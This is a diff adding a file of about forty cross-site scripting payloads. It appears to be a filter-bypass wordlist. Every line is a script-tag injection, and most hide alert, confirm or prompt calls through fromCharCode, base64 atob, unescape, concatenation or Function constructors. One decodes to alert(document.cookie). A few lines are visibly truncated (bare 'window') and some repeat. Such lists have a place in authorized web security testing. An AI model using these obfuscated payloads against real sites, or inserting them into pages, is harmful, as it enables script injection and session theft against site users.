@@ -1,0 +1,40 @@
+<script>/*--></script><svg/onload=alert(1)><!--</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setTimeout(()=>alert(1),0)</script>
+<script>eval('al'+'ert(1)')</script>
+<script>eval('con'+'firm(1)')</script>
+<script>eval(`al\u0065rt(1)`)</script>
+<script>eval(String.raw`alert(1)`)</script>
+<script>eval(unescape('%61%6C%65%72%74%281%29'))</script>
+<script>eval(decodeURIComponent('%61%6C%65%72%74%281%29'))</script>
+<script>eval(`${'al' + 'ert'}(1)`)</script>
+<script>(()=>alert(1))()</script>
+<script>(()=>confirm(1))()</script>
+<script>(()=>prompt(1))()</script>
+<script>window </script>
+<script>window['al'.concat('ert')](document.domain)</script>
+<script>eval('alert'.concat('(document.domain)'))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>
+<script>eval`alert\u0028document.domain\u0029`</script>
+<script>eval`prompt\u00281\u0029`</script>
+<script>setTimeout(() => alert(document.domain))</script>
+<script>new Function('prompt(1)')()</script>
+<script>new Function('confirm(1)')()</script>
+<script>eval(atob('cHJvbXB0KDEp'))</script>
+<script>eval(atob('Y29uZmlybSgxKQ=='))</script>
+<script>eval(atob('YWxlcnQoZG9tYWluKQ=='))</script>
+<script>eval(`window `) </script>
+<script>eval(`window `) </script>
+<script>eval("con".concat("firm(1)"))</script>
+<script>eval("pro"+"mpt(1)")</script>
+<script>eval("alert".concat("(1)"))</script>
+<script>eval('prompt'.concat('(1)'))</script>
+<script>eval('confirm'.concat('(1)'))</script>
+<script>eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))</script>
+<script>eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))</script>
